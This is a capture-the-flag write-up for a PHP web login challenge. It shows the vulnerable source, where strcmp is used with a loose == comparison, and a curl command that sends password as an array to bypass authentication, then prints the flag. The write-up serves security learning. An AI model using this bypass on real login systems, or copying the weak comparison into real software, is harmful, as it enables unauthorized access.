## Challenge Name: C Style Login
**Category:** Web

**Challenge Description:**

Can you guess my password?

Website: http://clogin.challs.olicyber.it

### Approach

This is the source code of the provided site:
```
<?php

include_once('./secrets.php');

if (isset($_GET['source'])) {
  highlight_file(__FILE__);
  return;
}
?>

<html>

<head>
  <title>C style login</title>
  <link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
  <div class="log-form">
    <div>
      <a href="/?source">Source code</a><br />
      <?php
      if (isset($_POST['password'])) {
        if (strcmp($_POST['password'], $password) == 0) {
          echo $FLAG;
        } else {
          echo '<br />Wrong Password<br /><br />';
        }
      }
      ?>
    </div>
    <h2>Login</h2>
    <form method="POST">
      <input type="password" name="password" placeholder="password" />
      <button type="submit" class="btn">Login</button>
    </form>
  </div>
</body>

</html>
``` 

By looking at the php code i found the possible vulnerabilty in  ```if (strcmp($_POST['password'], $password) == 0)``` knowing the ```==``` type conversion problem and ```strcmp()``` ambiguity with arrays.

To solve this challenge we can:
```
curl 'http://clogin.challs.olicyber.it/' --data-raw 'password[]=%22%22'
```

Or changing the data post form to 
```
<h2>Login</h2>
    <form method="POST">
      <input type="password" name="password[]" placeholder="password" />
      <button type="submit" class="btn">Login</button>
    </form>
```

Sending ```password[]``` rather than ```password``` makes the ```strcmp($_POST['password'], $password)``` return NULL since is comparing a string with an array.
The comparation with the ```==``` operator between NULL and 0 is True, so ```NULL == 0``` is true, and we can get the flag.


**Flag**

```
flag{strcmp_1s_n0t_s0_s4f3}    
```
### Reflections

This challenge demonstrates the importance of understanding the nuances of weak typing and type conversion in PHP. By exploiting the behavior of PHP's strcmp() function and weak comparison operators, we were able to bypass the authentication mechanism and obtain the flag.
  

---
<a href="/olicyber-training/main.md" class="btn">Back to home</a>
